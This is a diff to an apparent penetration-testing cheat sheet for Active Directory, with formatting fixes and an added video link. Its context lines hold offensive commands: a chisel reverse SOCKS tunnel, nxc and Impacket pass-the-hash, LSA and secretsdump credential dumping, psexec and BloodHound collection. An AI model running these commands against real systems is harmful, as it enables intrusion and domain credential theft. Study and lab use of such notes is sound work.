@@ -24,6 +24,7 @@ scp -P 22 chisel_linux privilege@192.168.80.10:~/
 
 Remote:
 ./chisel_linux client 10.10.200.34:8001 R:socks
+
 Local:
 ./chisel_linux server --port 8001 --reverse --socks5
 ```
@@ -31,18 +32,21 @@ Local:
 ### ldapsearch
 ```bash
 sudo proxychains ldapsearch -x -b "dc=something,dc=corp" "*" -H
+```
 
-### find all
+### Find all
 ```bash
 find / -iname "*admin*" 2>/dev/null
 ```
 
-### nxc
+### NXC
 ```bash
 nxc smb <IP> -u guest -p ''
 nxc smb <IP> -u '<USER>' -H <HASH>
 nxc smb <IP> -d something.corp -u <USER> -H <HASH> --lsa
 ```
+▶️ [Credential Validation via SMB](https://www.youtube.com/watch?v=-O3VEJ1Dc3k)
+
 ### bloodhound-python
 ```bash
 bloodhound-python -u '<USER>' -p '<PASSWORD>' -d something.corp -c all --zip -ns <IP> --dns-tcp
@@ -77,6 +81,7 @@ psexec.py 'DOMAIN/administrator@dc.something.corp' -hashes <HASH>
 ### Impacket
 ```bash
 secretsdump.py -hashes ':<HASH>' 'something.corp/<USER>@<IP>'
+
 lookupsid.py something.corp/<USER>@something.corp -hashes :<HASH>
 ```
 
